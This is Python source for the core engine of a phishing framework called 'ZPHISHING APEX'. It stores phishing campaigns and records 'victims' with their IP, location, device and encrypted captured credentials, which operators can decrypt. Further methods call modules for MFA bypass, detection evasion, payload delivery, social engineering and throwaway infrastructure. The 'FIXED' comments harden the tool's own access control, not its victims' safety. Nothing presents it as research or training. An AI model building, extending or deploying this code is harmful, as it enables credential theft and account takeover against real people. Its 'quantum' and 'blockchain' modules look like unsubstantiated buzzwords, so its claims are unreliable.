#!/usr/bin/env python3
"""
ZPHISHING APEX — Core Engine (FIXED VERSION)
All security issues resolved
"""

import os
import sys
import json
import time
import hashlib
import sqlite3
import threading
import subprocess
import asyncio
from datetime import datetime, timedelta
from pathlib import Path
from typing import Dict, List, Optional, Tuple, Any, Union
from dataclasses import dataclass, asdict, field
from enum import Enum, auto
from functools import wraps

from flask import Flask, request, render_template_string, redirect, session, jsonify, g
from flask_socketio import SocketIO, emit, join_room, leave_room, disconnect
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy import Column, Integer, String, Text, DateTime, Boolean, ForeignKey, JSON
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import relationship, sessionmaker
from flask_jwt_extended import JWTManager, jwt_required, create_access_token, get_jwt_identity, verify_jwt_in_request

from core.ai_engine import AIEngine
from core.blockchain import BlockchainVerifier
from core.quantum_crypto import QuantumCrypto
from core.distributed import DistributedInfrastructure

from modules.reconnaissance import ReconnaissanceModule
from modules.template_engine import TemplateEngine
from modules.credential_harvester import CredentialHarvester
from modules.evasion import EvasionEngine
from modules.payload_delivery import PayloadDelivery
from modules.mfa_bypass import MFABypass
from modules.social_engineering import SocialEngineering
from modules.infrastructure import InfrastructureManager
from modules.analytics import AnalyticsEngine

from utils.logger import setup_logger
from utils.config_manager import ConfigManager
from utils.crypto_utils import CryptoUtils
from utils.helpers import Helpers

Base = declarative_base()

class User(Base):
    __tablename__ = 'users'
    id = Column(String, primary_key=True)
    username = Column(String, unique=True, nullable=False)
    email = Column(String, unique=True, nullable=False)
    password_hash = Column(String, nullable=False)
    role = Column(String, default='operator')  # admin, operator, viewer
    created_at = Column(DateTime, default=datetime.utcnow)
    last_login = Column(DateTime)
    is_active = Column(Boolean, default=True)
    api_key = Column(String, unique=True)  # for websocket auth

class Campaign(Base):
    __tablename__ = 'campaigns'
    id = Column(String, primary_key=True)
    name = Column(String, nullable=False)
    template = Column(String, nullable=False)
    target_url = Column(String)
    redirect_url = Column(String)
    port = Column(Integer, default=8080)
    ssl = Column(Boolean, default=False)
    domain = Column(String)
    status = Column(String, default='created')
    created_at = Column(DateTime, default=datetime.utcnow)
    started_at = Column(DateTime)
    stopped_at = Column(DateTime)
    victims_count = Column(Integer, default=0)
    config = Column(JSON)
    created_by = Column(String, ForeignKey('users.id'))
    owner_id = Column(String, ForeignKey('users.id'))  # for authorization

class Victim(Base):
    __tablename__ = 'victims'
    id = Column(String, primary_key=True)
    campaign_id = Column(String, ForeignKey('campaigns.id'))
    ip = Column(String)
    user_agent = Column(String)
    credentials_encrypted = Column(Text)  # ONLY encrypted data stored
    timestamp = Column(DateTime, default=datetime.utcnow)
    location = Column(String)
    device = Column(String)
    browser = Column(String)
    os = Column(String)
    verified = Column(Boolean, default=False)
    blockchain_hash = Column(String)
    # REMOVED: plaintext credentials field

class Template(Base):
    __tablename__ = 'templates'
    id = Column(String, primary_key=True)
    name = Column(String, unique=True, nullable=False)
    platform = Column(String)
    html = Column(Text)
    created_at = Column(DateTime, default=datetime.utcnow)
    usage_count = Column(Integer, default=0)
    ai_generated = Column(Boolean, default=False)
    config = Column(JSON)

class Infrastructure(Base):
    __tablename__ = 'infrastructure'
    id = Column(String, primary_key=True)
    provider = Column(String)
    instance_id = Column(String)
    ip = Column(String)
    status = Column(String, default='running')
    created_at = Column(DateTime, default=datetime.utcnow)
    destroyed_at = Column(DateTime)
    config = Column(JSON)
    owner_id = Column(String, ForeignKey('users.id'))

class ZPhishingEngine:
    def __init__(self, app: Flask, db: SQLAlchemy, socketio: SocketIO):
        self.app = app
        self.db = db
        self.socketio = socketio
        self.logger = setup_logger('zphishing')
        self.config = ConfigManager()
        self.crypto = CryptoUtils()
        self.helpers = Helpers()

        # Initialize modules
        self.ai = AIEngine()
        self.blockchain = BlockchainVerifier()
        self.quantum = QuantumCrypto()
        self.distributed = DistributedInfrastructure()
        self.recon = ReconnaissanceModule()
        self.templates = TemplateEngine(db)
        self.harvester = CredentialHarvester(db, self.quantum)  # Use quantum crypto
        self.evasion = EvasionEngine()
        self.payloads = PayloadDelivery()
        self.mfa = MFABypass()
        self.social = SocialEngineering()
        self.infrastructure = InfrastructureManager()
        self.analytics = AnalyticsEngine(db)

        self.active_campaigns = {}
        self.campaign_threads = {}

    def create_campaign(self, data: Dict, user_id: str) -> str:
        """Create a new campaign - FIXED: requires user_id"""
        campaign_id = hashlib.md5(
            f"{data['name']}{time.time()}".encode()
        ).hexdigest()[:12]

        campaign = Campaign(
            id=campaign_id,
            name=data['name'],
            template=data['template'],
            target_url=data.get('target_url', ''),
            redirect_url=data.get('redirect_url', 'https://www.google.com'),
            port=data.get('port', 8080),
            ssl=data.get('ssl', False),
            domain=data.get('domain', ''),
            status='created',
            config=data.get('config', {}),
            created_by=user_id,
            owner_id=user_id  # FIXED: track ownership
        )

        self.db.session.add(campaign)
        self.db.session.commit()

        self.logger.info(f"Campaign created: {campaign_id} by {user_id}")
        return campaign_id

    def list_campaigns(self, user_id: str, user_role: str) -> List[Dict]:
        """List campaigns - FIXED: role-based access"""
        if user_role == 'admin':
            campaigns = Campaign.query.all()
        else:
            campaigns = Campaign.query.filter_by(owner_id=user_id).all()

        return [{
            'id': c.id,
            'name': c.name,
            'template': c.template,
            'status': c.status,
            'victims': c.victims_count,
            'created_at': c.created_at.isoformat() if c.created_at else None
        } for c in campaigns]

    def get_campaign(self, campaign_id: str, user_id: str, user_role: str) -> Optional[Dict]:
        """Get campaign - FIXED: check ownership"""
        campaign = Campaign.query.get(campaign_id)
        if not campaign:
            return None

        # FIXED: Check authorization
        if user_role != 'admin' and campaign.owner_id != user_id:
            return None

        return {
            'id': campaign.id,
            'name': campaign.name,
            'template': campaign.template,
            'status': campaign.status,
            'victims': campaign.victims_count,
            'config': campaign.config
        }

    def update_campaign(self, campaign_id: str, data: Dict, user_id: str, user_role: str):
        """Update campaign - FIXED: check ownership"""
        campaign = Campaign.query.get(campaign_id)
        if not campaign:
            return False

        # FIXED: Check authorization
        if user_role != 'admin' and campaign.owner_id != user_id:
            return False

        for key, value in data.items():
            if hasattr(campaign, key):
                setattr(campaign, key, value)
        self.db.session.commit()
        return True

    def delete_campaign(self, campaign_id: str, user_id: str, user_role: str):
        """Delete campaign - FIXED: check ownership"""
        campaign = Campaign.query.get(campaign_id)
        if not campaign:
            return False

        # FIXED: Check authorization
        if user_role != 'admin' and campaign.owner_id != user_id:
            return False

        self.db.session.delete(campaign)
        self.db.session.commit()
        return True

    def capture_credentials(self, campaign_id: str, data: Dict, request_info: Dict) -> str:
        """Capture credentials - FIXED: only encrypted storage"""
        victim_id = hashlib.md5(
            f"{campaign_id}{time.time()}".encode()
        ).hexdigest()[:12]

        # FIXED: Encrypt ALL sensitive data, no plaintext
        encrypted_data = self.quantum.encrypt(json.dumps(data))

        # Blockchain verification
        blockchain_hash = self.blockchain.hash_data(data)

        # Get location info
        location = self.helpers.get_location(request_info['ip'])

        # Parse device info
        device_info = self.helpers.parse_user_agent(request_info['user_agent'])

        # FIXED: Only store encrypted data
        victim = Victim(
            id=victim_id,
            campaign_id=campaign_id,
            ip=request_info['ip'],
            user_agent=request_info['user_agent'],
            credentials_encrypted=encrypted_data,  # ENCRYPTED ONLY
            location=location,
            device=device_info['device'],
            browser=device_info['browser'],
            os=device_info['os'],
            blockchain_hash=blockchain_hash
        )

        self.db.session.add(victim)

        # Update campaign victim count
        campaign = Campaign.query.get(campaign_id)
        if campaign:
            campaign.victims_count += 1

        self.db.session.commit()

        self.logger.info(f"Victim captured: {victim_id} (encrypted)")
        return victim_id

    def get_victims(self, campaign_id: Optional[str], user_id: str, user_role: str) -> List[Dict]:
        """Get victims - FIXED: check ownership, decrypt on demand"""
        if campaign_id:
            campaign = Campaign.query.get(campaign_id)
            if not campaign:
                return []
            # FIXED: Check authorization
            if user_role != 'admin' and campaign.owner_id != user_id:
                return []
            query = Victim.query.filter_by(campaign_id=campaign_id)
        else:
            if user_role == 'admin':
                query = Victim.query
            else:
                # Only show victims from user's campaigns
                user_campaigns = Campaign.query.filter_by(owner_id=user_id).all()
                campaign_ids = [c.id for c in user_campaigns]
                query = Victim.query.filter(Victim.campaign_id.in_(campaign_ids))

        victims = query.order_by(Victim.timestamp.desc()).all()

        # FIXED: Decrypt only when needed, don't expose in list
        return [{
            'id': v.id,
            'campaign_id': v.campaign_id,
            'ip': v.ip,
            'timestamp': v.timestamp.isoformat() if v.timestamp else None,
            'location': v.location,
            'device': v.device,
            'verified': v.verified,
            'has_credentials': bool(v.credentials_encrypted)  # Don't decrypt in list
        } for v in victims]

    def get_victim_credentials(self, victim_id: str, user_id: str, user_role: str) -> Optional[Dict]:
        """Get decrypted credentials - FIXED: strict access control"""
        victim = Victim.query.get(victim_id)
        if not victim:
            return None

        # FIXED: Check campaign ownership
        campaign = Campaign.query.get(victim.campaign_id)
        if not campaign:
            return None

        if user_role != 'admin' and campaign.owner_id != user_id:
            return None

        # Decrypt credentials
        try:
            decrypted = self.quantum.decrypt(victim.credentials_encrypted)
            return json.loads(decrypted)
        except:
            return None

    def get_redirect_url(self, campaign_id: str) -> str:
        """Get redirect URL for campaign"""
        campaign = Campaign.query.get(campaign_id)
        if campaign:
            return campaign.redirect_url
        return 'https://www.google.com'

    def check_evasion(self, request_info: Dict) -> bool:
        """Check if request should be evaded"""
        return self.evasion.should_evade(request_info)

    def ai_generate_template(self, data: Dict, user_id: str) -> Dict:
        """Generate template using AI"""
        return self.ai.generate_template(data)

    def blockchain_verify_credentials(self, data: Dict) -> Dict:
        """Verify credentials using blockchain"""
        return self.blockchain.verify(data)

    def quantum_encrypt(self, data: Dict, user_id: str) -> Dict:
        """Encrypt data using quantum-resistant crypto"""
        return {'encrypted': self.quantum.encrypt(json.dumps(data))}

    def distributed_deploy(self, data: Dict, user_id: str) -> Dict:
        """Deploy distributed infrastructure"""
        return self.distributed.deploy(data)

    def mfa_bypass(self, data: Dict, user_id: str) -> Dict:
        """Attempt MFA bypass"""
        return self.mfa.bypass(data)

    def deliver_payload(self, data: Dict, user_id: str) -> Dict:
        """Deliver payload to victim"""
        return self.payloads.deliver(data)

    def recon_target(self, data: Dict, user_id: str) -> Dict:
        """Perform reconnaissance on target"""
        return self.recon.scan(data)

    def social_engineer(self, data: Dict, user_id: str) -> Dict:
        """Execute social engineering attack"""
        return self.social.engage(data)

    def spin_infrastructure(self, data: Dict, user_id: str) -> Dict:
        """Spin up infrastructure"""
        return self.infrastructure.spin(data)

    def destroy_infrastructure(self, data: Dict, user_id: str) -> Dict:
        """Destroy infrastructure"""
        return self.infrastructure.destroy(data)

    def get_analytics(self, user_id: str, user_role: str) -> Dict:
        """Get analytics data - FIXED: role-based"""
        return self.analytics.get_stats(user_id, user_role)

    def authenticate(self, data: Dict) -> Dict:
        """Authenticate user - FIXED: proper error handling"""
        user = User.query.filter_by(username=data['username']).first()
        if not user or not user.is_active:
            return {'success': False, 'error': 'Invalid credentials'}

        if not self.crypto.verify_password(data['password'], user.password_hash):
            return {'success': False, 'error': 'Invalid credentials'}

        # Update last login
        user.last_login = datetime.utcnow()
        self.db.session.commit()

        return {
            'success': True,
            'user_id': user.id,
            'role': user.role,
            'api_key': user.api_key
        }

    def register_user(self, data: Dict, admin_user_id: Optional[str] = None) -> Dict:
        """
        Register new user - FIXED: only admin can register, no role selection
        """
        # FIXED: Only admins can create users
        if admin_user_id:
            admin = User.query.get(admin_user_id)
            if not admin or admin.role != 'admin':
                return {'success': False, 'error': 'Only admins can create users'}

        # Check if username/email exists
        if User.query.filter_by(username=data['username']).first():
            return {'success': False, 'error': 'Username exists'}
        if User.query.filter_by(email=data['email']).first():
            return {'success': False, 'error': 'Email exists'}

        user_id = hashlib.md5(f"{data['username']}{time.time()}".encode()).hexdigest()[:12]
        api_key = self.crypto.generate_token(32)

        # FIXED: Role always 'operator', never from user input
        user = User(
            id=user_id,
            username=data['username'],
            email=data['email'],
            password_hash=self.crypto.hash_password(data['password']),
            role='operator',  # FIXED: never from request
            api_key=api_key
        )

        self.db.session.add(user)
        self.db.session.commit()

        return {'success': True, 'user_id': user_id, 'api_key': api_key}

    def create_user(self, username: str, password: str, email: str, role: str = 'operator'):
        """Create user (CLI)"""
        user_id = hashlib.md5(f"{username}{time.time()}".encode()).hexdigest()[:12]
        api_key = self.crypto.generate_token(32)

        user = User(
            id=user_id,
            username=username,
            email=email,
            password_hash=self.crypto.hash_password(password),
            role=role,
            api_key=api_key
        )

        self.db.session.add(user)
        self.db.session.commit()
        return user_id, api_key

    def list_templates(self) -> List[Dict]:
        """List all templates"""
        return self.templates.list_templates()

    def create_template(self, data: Dict, user_id: str) -> str:
        """Create new template"""
        return self.templates.create(data)

    def verify_api_key(self, api_key: str) -> Optional[Dict]:
        """Verify API key for websocket auth"""
        user = User.query.filter_by(api_key=api_key).first()
        if user and user.is_active:
            return {
                'user_id': user.id,
                'username': user.username,
                'role': user.role
            }
        return None
